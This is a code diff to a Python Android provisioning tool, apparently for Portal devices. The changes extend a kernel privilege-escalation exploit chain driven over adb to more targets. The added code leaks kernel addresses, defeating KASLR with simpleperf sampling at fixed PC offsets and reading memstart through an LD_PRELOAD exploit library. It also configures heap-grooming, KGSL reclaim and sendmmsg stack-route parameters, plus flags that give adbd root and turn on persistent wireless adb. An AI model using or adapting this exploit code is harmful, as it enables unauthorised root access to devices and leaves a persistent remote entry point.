@@ -8,6 +8,7 @@ import collections
 import datetime as dt
 import hashlib
 import json
+import os
 import pathlib
 import re
 import select
@@ -344,22 +345,27 @@ class PortalProvisioner:
         device = self.adb_run(
             ["shell", "getprop", "ro.product.device"], timeout=5, check=True
         ).stdout.strip()
-        target = find_target(device, fingerprint)
+        product_model = self.adb_run(
+            ["shell", "getprop", "ro.product.model"], timeout=5, check=True
+        ).stdout.strip()
+        target = find_target(device, fingerprint, product_model)
         self.target = target
         if target is None and require_supported:
             raise ProvisionError(
                 "unsupported firmware; refusing build-specific kernel writes\n"
-                f"device: {device}\nfingerprint: {fingerprint}"
+                f"model: {product_model}\ndevice: {device}\n"
+                f"fingerprint: {fingerprint}"
             )
         if target is None:
             print(
-                f"TARGET_UNSUPPORTED serial={self.serial} device={device} "
+                f"TARGET_UNSUPPORTED serial={self.serial} "
+                f"model={product_model} device={device} "
                 f"fingerprint={fingerprint}"
             )
         else:
             print(
                 f"TARGET_OK serial={self.serial} target={target.key} "
-                f"device={device} fingerprint={fingerprint}"
+                f"model={product_model} device={device} fingerprint={fingerprint}"
             )
         return target
 
@@ -467,7 +473,7 @@ class PortalProvisioner:
         candidates = [pathlib.Path(__file__).resolve(), ROOT / "tools/portal_targets.py"]
         if self.target:
             candidates.append(self.target.preload_path(ROOT))
-        if self.privileged_requested():
+        if self.privileged_requested() and self.uses_exploit_sentinel():
             candidates.append(EXPLOIT_SENTINEL_LOCAL)
         if self.audio:
             candidates.append(HELPER_LOCAL)
@@ -555,7 +561,8 @@ class PortalProvisioner:
 
         fingerprint = shell("getprop", "ro.build.fingerprint", timeout=5)
         device = shell("getprop", "ro.product.device", timeout=5)
-        target = find_target(device, fingerprint)
+        product_model = shell("getprop", "ro.product.model", timeout=5)
+        target = find_target(device, fingerprint, product_model)
         disabled_output = shell("pm", "list", "packages", "-d")
         disabled = {
             line.removeprefix("package:").strip()
@@ -719,6 +726,7 @@ class PortalProvisioner:
             "target": {
                 "supported": target is not None,
                 "key": target.key if target else None,
+                "model": product_model,
                 "device": device,
                 "fingerprint": fingerprint,
             },
@@ -982,6 +990,9 @@ class PortalProvisioner:
             )
         )
 
+    def uses_exploit_sentinel(self) -> bool:
+        return self.target is None or self.target.proc_uid_sentinel != "thread"
+
     def dry_run_report(self, status: dict[str, object]) -> None:
         actions = self.requested_actions()
         kiosk = status.get("kiosk_satellite", {})
@@ -1018,7 +1029,7 @@ class PortalProvisioner:
         required_outputs = []
         if self.target:
             required_outputs.append(str(self.target.preload_path(ROOT)))
-        if self.privileged_requested():
+        if self.privileged_requested() and self.uses_exploit_sentinel():
             required_outputs.append(str(EXPLOIT_SENTINEL_LOCAL))
         if self.audio:
             required_outputs.append(str(HELPER_LOCAL))
@@ -1897,27 +1908,62 @@ class PortalProvisioner:
         return True
 
     def kaslr_base(self, tag: str) -> int:
-        offsets = (
-            0x3D7E,
-            0x3D54,
-            0x153C,
-            0x11756DC,
-            0x1175724,
-            0x363C6,
-            0xAF90E,
-            0x136E,
-            0x3A72,
-        )
+        if self.target is None:
+            raise ProvisionError("target must be selected before KASLR discovery")
+        offsets = self.target.kaslr_pc_offsets
+        simpleperf = "simpleperf"
+        if self.target.bundled_simpleperf:
+            roots = [
+                pathlib.Path(value)
+                for name in ("ANDROID_NDK_HOME", "ANDROID_NDK_ROOT", "NDK")
+                if (value := os.environ.get(name))
+            ]
+            roots.extend(
+                (
+                    pathlib.Path.home() / "android-sdk/ndk",
+                    pathlib.Path.home() / "Android/Sdk/ndk",
+                )
+            )
+            candidates: list[pathlib.Path] = []
+            for root in roots:
+                if (root / "simpleperf/bin/android/arm64/simpleperf").is_file():
+                    candidates.append(root / "simpleperf/bin/android/arm64/simpleperf")
+                if root.is_dir():
+                    candidates.extend(
+                        sorted(
+                            root.glob("*/simpleperf/bin/android/arm64/simpleperf"),
+                            reverse=True,
+                        )
+                    )
+            local_simpleperf = next(
+                (candidate for candidate in candidates if candidate.is_file()),
+                None,
+            )
+            if local_simpleperf is None:
+                raise ProvisionError(
+                    "this target needs the Android NDK arm64 simpleperf binary; "
+                    "set ANDROID_NDK_HOME to the installed NDK directory"
+                )
+            simpleperf = "/data/local/tmp/portal-simpleperf"
+            self.adb_run(
+                ["push", str(local_simpleperf), simpleperf],
+                timeout=30,
+                check=True,
+            )
+            self.adb_run(
+                ["shell", "chmod", "0755", simpleperf], timeout=5, check=True
+            )
         for sample_try in range(3):
             remote = f"/data/local/tmp/portal-perf-{tag}-{sample_try}.data"
             command = (
-                "simpleperf record -g -e cpu-clock -f 4000 --duration 2 "
+                f"{shlex.quote(simpleperf)} record -g -e cpu-clock -f 4000 "
+                "--duration 2 "
                 f"-o {shlex.quote(remote)} -- /system/bin/dd if=/dev/zero "
                 "of=/dev/null bs=4096"
             )
             self.adb_run(["shell", command], timeout=20)
             report = self.adb_run(
-                ["shell", "simpleperf", "report-sample", "-i", remote],
+                ["shell", simpleperf, "report-sample", "-i", remote],
                 timeout=30,
             )
             self.adb_run(["shell", "rm", "-f", remote], timeout=5)
@@ -2138,6 +2184,27 @@ class PortalProvisioner:
             print(f"EXPLOIT_SENTINEL_REMOVE_DEFERRED error={exc}")
 
     def memstart(self, tag: str) -> int:
+        if self.target is None:
+            raise ProvisionError("target must be selected before memory discovery")
+        if self.target.memstart_strategy == "allocator":
+            command = (
+                "env GHOSTLOCK_VOLATILE_LOG=1 "
+                "GHOSTLOCK_DIAG_PAGE_PREP_ONLY=1 "
+                "GHOSTLOCK_PAGE_COLLISIONS=5 "
+                "GHOSTLOCK_LOG_P0_CANDIDATES=1 "
+                f"LD_PRELOAD={shlex.quote(PRELOAD_REMOTE)} /system/bin/true"
+            )
+            for _ in range(3):
+                result = self.adb_run(["shell", command], timeout=90)
+                match = re.search(
+                    r"runtime alias .*?memstart=([0-9a-fA-F]{16})",
+                    result.stdout,
+                )
+                if result.returncode == 0 and match:
+                    return int(match.group(1), 16)
+            raise ProvisionError(
+                "allocator diagnostic did not expose a verified memstart_addr"
+            )
         result = self.adb_run(["shell", "bugreportz", "-p"], timeout=180)
         match = re.search(r"OK:(\S+\.zip)", result.stdout)
         if not match:
@@ -2169,6 +2236,9 @@ class PortalProvisioner:
         ) & 0xFFFFFFFFFFFFFFFF
 
     def exploit(self, base: int, memstart: int, attempt: int) -> bool:
+        if self.target is None:
+            raise ProvisionError("target must be selected before exploitation")
+        stack_route = self.target.stack_route
         environment = {
             "GHOSTLOCK_KASLR_BASE": hex(base),
             "GHOSTLOCK_P0_MEMSTART": hex(memstart),
@@ -2177,24 +2247,54 @@ class PortalProvisioner:
             "GHOSTLOCK_PAGE_COLLISIONS": "5",
             "GHOSTLOCK_BUDDY_HOLD_PAIRS": "64",
             "GHOSTLOCK_BUDDY_HOLD_SENDS": "1024",
-            "GHOSTLOCK_RECLAIM_PAIRS": "64",
-            "GHOSTLOCK_RECLAIM_SENDS": "64",
+            "GHOSTLOCK_RECLAIM_PAIRS": str(self.target.reclaim_pairs),
+            "GHOSTLOCK_RECLAIM_SENDS": str(self.target.reclaim_sends),
             "GHOSTLOCK_SOCKET_WATCH": "1",
             "GHOSTLOCK_WATCH_CFI": "1",
             "GHOSTLOCK_SENDMMSG_PROC_UID_LOCK": "1",
-            "GHOSTLOCK_PROC_UID_APP_SENTINEL": "1",
-            "GHOSTLOCK_PROC_UID_RUNAS_SENTINEL": "1",
-            "GHOSTLOCK_PROC_UID_RUNAS_PACKAGE": EXPLOIT_SENTINEL_PACKAGE,
             "GHOSTLOCK_SLIDE_BREAK_OWNER_CHAIN": "1",
             "GHOSTLOCK_HOLD_AFTER_SCHED": "1",
-            "GHOSTLOCK_MAIN_ROUTE": "slide-sendmmsg",
-            "GHOSTLOCK_FOPS_STACK_ROUTE": "sendmmsg",
+            "GHOSTLOCK_MAIN_ROUTE": f"slide-{stack_route}",
+            "GHOSTLOCK_FOPS_STACK_ROUTE": stack_route,
+            "GHOSTLOCK_SIGSTAMP_USEC": str(self.target.route_delay_usec),
             "GHOSTLOCK_PROC_UID_WARM_MB": "256",
             "GHOSTLOCK_ADBD_ROOT_CONFIGFS": "1",
             "GHOSTLOCK_ROOT_SELF_CONFIGFS": "1",
             "GHOSTLOCK_VOLATILE_LOG": "1",
             "LD_PRELOAD": PRELOAD_REMOTE,
         }
+        if self.target.kgsl_reclaim:
+            environment.update(
+                {
+                    "GHOSTLOCK_KGSL_ORDER2": "1",
+                    "GHOSTLOCK_KGSL_WATCH": "1",
+                    "GHOSTLOCK_KGSL_HOLD": "1024",
+                    "GHOSTLOCK_KGSL_RECLAIM": "4096",
+                    "GHOSTLOCK_KGSL_RECLAIM_EARLY": "512",
+                    "GHOSTLOCK_FOPS_TILE_TABLES": "1",
+                }
+            )
+        if self.target.mm_recycle_slabs:
+            environment["GHOSTLOCK_MM_RECYCLE_SLABS"] = str(
+                self.target.mm_recycle_slabs
+            )
+        if self.target.proc_uid_sentinel in ("run_as", "app"):
+            environment["GHOSTLOCK_PROC_UID_APP_SENTINEL"] = "1"
+            if self.target.proc_uid_sentinel == "run_as":
+                environment.update(
+                    {
+                    "GHOSTLOCK_PROC_UID_RUNAS_SENTINEL": "1",
+                    "GHOSTLOCK_PROC_UID_RUNAS_PACKAGE": (
+                        EXPLOIT_SENTINEL_PACKAGE
+                    ),
+                    }
+                )
+            else:
+                environment["GHOSTLOCK_PROC_UID_APP_COMPONENT"] = (
+                    f"{EXPLOIT_SENTINEL_PACKAGE}/.SentinelActivity"
+                )
+        else:
+            environment["GHOSTLOCK_PROC_UID_SENTINEL_NICE"] = "0"
         if self.persist_wireless_adb:
             environment["GHOSTLOCK_ENABLE_WIRELESS_ADB"] = "1"
         if self.audio and not self.audio_already_configured:
@@ -3837,14 +3937,16 @@ class PortalProvisioner:
                     self.disable_camera_light
                     or self.presence_fps_cap is not None
                 ),
-                build_sentinel=True,
+                build_sentinel=self.uses_exploit_sentinel(),
             )
         if self.shizuku:
             self.install_shizuku_payload()
         if self.restore_presence_fps or self.restore_presence_profile:
             self.uninstall_presence_helper()
-        self.prepare_exploit_sentinel()
-        sentinel_removed = False
+        use_exploit_sentinel = self.uses_exploit_sentinel()
+        if use_exploit_sentinel:
+            self.prepare_exploit_sentinel()
+        sentinel_removed = not use_exploit_sentinel
         try:
             self.stage()
             clean_boot_id: str | None = None
@@ -3876,8 +3978,9 @@ class PortalProvisioner:
                 if not exploit_ok:
                     clean_boot_id = post_attempt_boot
                     continue
-                self.uninstall_exploit_sentinel()
-                sentinel_removed = True
+                if use_exploit_sentinel:
+                    self.uninstall_exploit_sentinel()
+                    sentinel_removed = True
                 if self.enable_updates:
                     self.enable_ota_packages()
                 if self.remove_shizuku:
@@ -3897,7 +4000,7 @@ class PortalProvisioner:
                 self.verify_across_two_reboots(first_boot=post_attempt_boot)
                 return
         finally:
-            if not sentinel_removed:
+            if use_exploit_sentinel and not sentinel_removed:
                 self.uninstall_exploit_sentinel(best_effort=True)
         raise ProvisionError(f"provisioning failed after {self.attempts} attempts")
 
